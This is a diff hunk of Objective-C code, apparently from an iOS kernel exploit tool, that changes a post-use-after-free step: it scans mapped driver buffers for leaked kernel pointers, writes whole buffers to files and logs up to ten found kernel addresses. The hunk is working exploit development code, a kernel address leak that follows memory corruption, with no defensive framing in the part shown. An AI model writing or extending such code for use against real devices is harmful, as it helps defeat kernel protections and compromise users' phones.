@@ -3930,30 +3930,37 @@ static const char kOpenPropertiesGarbage[] =
         }
     }
 
-    // ---- Post-UAF mapped buffer scan ----
-    // Provider state is corrupted. Scan our already-mapped buffers for kernel pointers.
-    [self appendLog:@"\n====== Post-UAF Mapped Buffer Scan ======"];
+    // ---- Post-UAF deep buffer scan + full dump ----
+    [self appendLog:@"\n====== Post-UAF Deep Buffer Scan ======"];
+    NSString *swordDir = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject stringByAppendingPathComponent:@"sword"];
     int kleakFound = 0;
-    const char *kaddrPath = [[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject stringByAppendingPathComponent:@"sword/kaddr.txt"] UTF8String];
-    // Scan ALL mapped buffers (primary + auxiliary)
-    for (int bi = 0; bi < kMaxAux && kleakFound == 0; bi++) {
+    // Dump full primary buffer + scan all buffers
+    for (int bi = 0; bi < kMaxAux; bi++) {
         mach_vm_address_t bufAddr = (bi == 0) ? mappedAddr : (bi < kMaxAux ? auxMappedAddrs[bi] : 0);
         mach_vm_size_t bufSize = (bi == 0) ? mappedSize : (bi < kMaxAux ? auxMappedSizes[bi] : 0);
         if (bufAddr == 0 || bufSize < 8) continue;
         const uint8_t *buf = (const uint8_t *)(uintptr_t)bufAddr;
-        for (int off = 0; off + 8 <= (int)bufSize && off < 4096; off += 8) {
+        int scanLen = (int)MIN(bufSize, 4096);
+        // Dump entire buffer to file
+        NSString *dumpPath = [swordDir stringByAppendingPathComponent:[NSString stringWithFormat:@"buffer_%d.bin", bi]];
+        [[NSData dataWithBytes:buf length:scanLen] writeToFile:dumpPath atomically:YES];
+        // Scan every 8-byte aligned offset
+        for (int off = 0; off + 8 <= scanLen; off += 8) {
             uint64_t val = 0;
             memcpy(&val, buf + off, sizeof(val));
             if ((val >> 32) == 0xfffffff0ULL && val < 0xfffffff800000000ULL) {
-                [self appendLog:[NSString stringWithFormat:@"  *** KERNEL ADDR at buffer[%d] offset=%d: 0x%016llx", bi, off, val]];
-                [[NSString stringWithFormat:@"0x%016llx buf=%d off=%d\n", val, bi, off] writeToFile:[NSString stringWithUTF8String:kaddrPath] atomically:YES];
+                [self appendLog:[NSString stringWithFormat:@"  *** KERNEL ADDR buf[%d]+0x%x = 0x%016llx", bi, off, val]];
+                [[NSString stringWithFormat:@"0x%016llx buf=%d off=0x%x\n", val, bi, off] writeToFile:[swordDir stringByAppendingPathComponent:@"kaddr.txt"] atomically:YES];
                 kleakFound++;
-                if (kleakFound >= 5) break;
+                if (kleakFound >= 10) break;
             }
         }
+        if (kleakFound >= 10) break;
     }
     if (kleakFound == 0) {
-        [self appendLog:@"  No kernel addresses found in mapped buffers."];
+        [self appendLog:[NSString stringWithFormat:@"  No kernel addrs in %d buffers (full dump saved)", kMaxAux]];
+    } else {
+        [self appendLog:[NSString stringWithFormat:@"  Found %d kernel addresses", kleakFound]];
     }
 
     // ---- Release multi-conn client slots ----
